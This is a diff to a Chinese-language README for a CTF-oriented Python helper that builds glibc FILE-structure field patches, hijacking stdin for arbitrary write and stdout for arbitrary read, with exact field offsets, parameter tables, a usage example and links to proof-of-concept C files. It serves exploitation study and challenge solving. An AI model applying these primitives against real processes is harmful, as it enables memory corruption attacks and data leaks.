@@ -90,6 +90,132 @@ _fileno        = 1
 
 两份 C 文件末尾分别列出 stdin/stdout 低字段的题目补丁伪代码；不再生成绑定占位地址的二进制 payload。
 
+## Python 离线板子
+
+[`io_file.py`](./io_file.py) 提供两个标准流字段补丁函数和两个辅助函数。
+
+### 函数用途
+
+```text
+build_stdin_arbitrary_write：
+    让 stdin underflow 触发 read(fd, target, length)，实现 fd -> 内存 AAW
+
+build_stdout_arbitrary_read：
+    让 stdout fflush 触发 write(fd, target, length)，实现内存 -> fd AAR/leak
+
+apply_patches：
+    把 FieldPatch 合并成 FILE 大小镜像
+
+patches_by_field：
+    按字段名返回编码值，方便 edit(offset, data) 逐段写入
+```
+
+### 对应 PoC
+
+- [`poc_stdin_arbitrary_write_2.23_2.43.c`](./poc_stdin_arbitrary_write_2.23_2.43.c)；
+- [`poc_stdout_arbitrary_read_2.23_2.43.c`](./poc_stdout_arbitrary_read_2.23_2.43.c)。
+
+### `build_stdin_arbitrary_write` 参数
+
+| 参数 | 含义 |
+|---|---|
+| `target` | stdin underflow 通过 `read` 写入的目标地址。 |
+| `length` | 允许本次 `read` 写入的最大字节数，必须大于 0。 |
+| `fd` | 被劫持 stdin 使用的文件描述符，默认 `0`；题目若从其他 fd 提供输入可修改。 |
+| `current_flags` | 当前 `_flags` 值；传入后函数只清除 `_IO_NO_READS` 和 `_IO_EOF_SEEN`，其余位保持不变；未知时省略。 |
+
+生成的字段：
+
+```text
++0x00  _flags（可选，4 字节）
++0x08  _IO_read_base = target
++0x10  _IO_read_ptr  = target
++0x18  _IO_read_end  = target
++0x38  _IO_buf_base  = target
++0x40  _IO_buf_end   = target + length
++0x70  _fileno       = fd（4 字节）
+```
+
+### `build_stdout_arbitrary_read` 参数
+
+| 参数 | 含义 |
+|---|---|
+| `target` | stdout `fflush` 通过 `write` 输出的进程内存地址。 |
+| `length` | 输出区间长度，函数设置为 `[target, target + length)`。 |
+| `fd` | stdout 最终写入的文件描述符，默认 `1`。 |
+
+生成的字段：
+
+```text
++0x08  _IO_read_base  = target
++0x10  _IO_read_ptr   = target
++0x18  _IO_read_end   = target
++0x20  _IO_write_base = target
++0x28  _IO_write_ptr  = target + length
++0x30  _IO_write_end  = target + length
++0x38  _IO_buf_base   = target
++0x40  _IO_buf_end    = target + length
++0x70  _fileno        = fd（4 字节）
+```
+
+`_IO_read_end == _IO_write_base` 可避免 pipe/socket 场景下进入不必要的 `lseek` 分支。
+
+### 最小使用示例
+
+```python
+from io_file import (
+    apply_patches,
+    build_stdin_arbitrary_write,
+    build_stdout_arbitrary_read,
+)
+
+# stdin 任意写：后续 fgetc/fread 触发 read(0, target, 0x80)
+patches = build_stdin_arbitrary_write(
+    target=0x404000,
+    length=0x80,
+    fd=0,
+    current_flags=0xfbad2084,  # 已知 stdin _flags；未知可省略
+)
+for p in patches:
+    print(p.field, hex(p.offset), p.data.hex())
+    # edit(stdin_addr + p.offset, p.data)
+
+# stdout 任意读：后续 fflush(stdout) 触发 write(1, target, 0x40)
+patches = build_stdout_arbitrary_read(target=0x7fff3000, length=0x40)
+image = apply_patches(patches)  # 合并为 FILE 镜像
+print(len(image), image[0x20:0x28].hex())
+```
+
+### 返回对象
+
+返回 `FieldPatch` 元组。`FieldPatch` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `offset` | FILE 内偏移。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `field` | 字段名，用于调试和识别。 |
+
+`_flags` 和 `_fileno` 均按 4 字节生成，避免覆盖相邻字段。可直接映射到题目的 `edit(offset, data)`，或用 `apply_patches` 合并为 FILE 镜像。
+
+### 调用者必须提供
+
+```text
+libc/FILE 地址
+stdin 或 stdout 对象可覆盖能力
+能触发 fgetc/fread 或 fflush/printf 的入口
+目标地址和现有 flags
+```
+
+### 函数不负责
+
+```text
+不负责 FILE 投递
+不触发 stdio 消费点
+不处理 puts/printf 对 write 指针的修改
+不覆盖 vtable（保留对象原有合法 vtable）
+```
+
 运行示例：
 
 ```bash
